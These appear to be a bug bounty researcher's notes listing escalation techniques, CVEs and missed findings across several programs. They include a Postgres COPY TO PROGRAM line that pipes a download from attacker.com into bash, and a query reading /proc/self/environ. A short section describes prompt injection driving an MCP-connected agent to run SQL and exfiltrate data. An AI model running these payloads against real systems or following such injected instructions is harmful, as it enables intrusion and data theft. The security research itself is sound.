# Cross-Program Escalation Research (June 2026)

Session outcome: Applied escalation techniques from 6 books, CVEs, and online research
to 5 programs' source code. Found multiple chaining paths previously missed.

## Books Referenced

| Book | Key Chapters Used |
|------|-------------------|
| Bug Bounty Bootcamp (Vickie Li) | Ch10 IDOR, Ch16 SSTI, Ch17 Logic, Ch21 Info Disclosure, Ch22 Methodology |
| Hacking APIs (Corey Ball) | Ch8 Auth Testing, Ch10 BOLA/BFLA, Ch11 Mass Assignment, Ch13 WAF Evasion |
| Web App Hacker's Handbook (Stuttard) | Chaining vulnerabilities, auth bypass patterns |
| RTFM (Ben Clark) | Red Team commands (post-exploitation) |
| Linux Basics for Hackers | OS fundamentals for post-exploitation |

## CVEs & Writeups Consulted

| CVE / Resource | Target | Key Technique |
|---------------|--------|---------------|
| CVE-2026-31813 | Supabase Auth | ID token forgery via Apple/Azure |
| CVE-2024-24213 | Supabase Postgres | SQL injection via pg-meta/query |
| SupaPwn ($25k) | Supabase Cloud | postgres_fdw event trigger race → superuser → COPY TO PROGRAM → shell → SUID wal-g → root → orchestration credentials |
| CVE-2025-66478 (React2Shell) | Next.js/React | prototype pollution via RSC payload → CVSS 10.0 RCE |
| CVE-2025-55182 | React Server Components | Underlying deserialization bug |
| CVE-2025-55183 | React Server Components | Source code leak (post-patch) |
| CVE-2025-55184 | React Server Components | DoS via infinite loops (post-patch) |
| CVE-2025-37734 | Kibana | Origin validation error → SSRF |
| CVE-2025-6454 | GitLab | CRLF injection in webhook custom headers |
| CVE-2021-22175 | GitLab | DNS rebinding SSRF bypass |
| CVE-2022-35912 | PostgREST | db-pre-request hook → superuser escalation |
| CVE-2024-4157 | Havoc C2 | SSRF + RCE chain |
| Assetnote blind-ssrf-chains | General | Spray known internal ports after SSRF confirmation |

## Supabase MCP Prompt Injection (July 2025 Leak)

- The Supabase MCP server (github.com/supabase-community/supabase-mcp) allows LLM agents to execute SQL against a Supabase database
- Prompt injection can trick the agent into running arbitrary SQL, including data exfiltration
- Mitigation: `readonly` flag prevents INSERT/UPDATE/DELETE but still allows SELECT
- Key insight: AI agent tool-use with read+write access is a "lethal trifecta" (read data, write to attacker server, all via tool chaining)

## Postgres Privilege Escalation Techniques

From HackTricks + SupaPwn research:

1. **Event Trigger Race**: Create event trigger on DDL → run during postgres_fdw after-create script (which temporarily elevates postgres to superuser) → execute `CREATE ROLE priv_esc WITH SUPERUSER`

2. **CREATEROLE → pg_execute_server_program**: User with CREATEROLE can grant `pg_execute_server_program` to themselves → execute shell commands

3. **COPY TO PROGRAM** (requires superuser or pg_execute_server_program):
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/exfil | bash';
```

4. **pg_read_file / pg_read_binary_file** (requires superuser):
```sql
SELECT pg_read_file('/proc/self/environ');
```

5. **CREATE EXTENSION** with untrusted languages (plpython3u, plsh, etc.)

## What We Missed Before This Session

| Program | What We Knew | What We Missed | Severity Impact |
|---------|-------------|----------------|-----------------|
| Supabase | Auth bypass (CVSS 10.0) | Service key leak, SQL→RCE, JWT secret, SSRF chain | Same (10.0) but with RCE evidence |
| Elastic | Webhook SSRF (duplicate) | AI Assistant→Connector SSRF chain (HIGH, UNFIXED) | New finding |
| Vercel Next.js | launch-editor + SSRF | DNS rebinding TOCTOU in fetchExternalImage (UNFIXED) | New finding |
| Discourse | AI audit log IDOR (5.3) | show_debug_info full payload leak (6.5) | CVSS 5.3 → 6.5 |
| GitLab | Redirect SSRF blocked | CRLF, DNS rebinding, IPv6 zone IDs untested | No new finding |
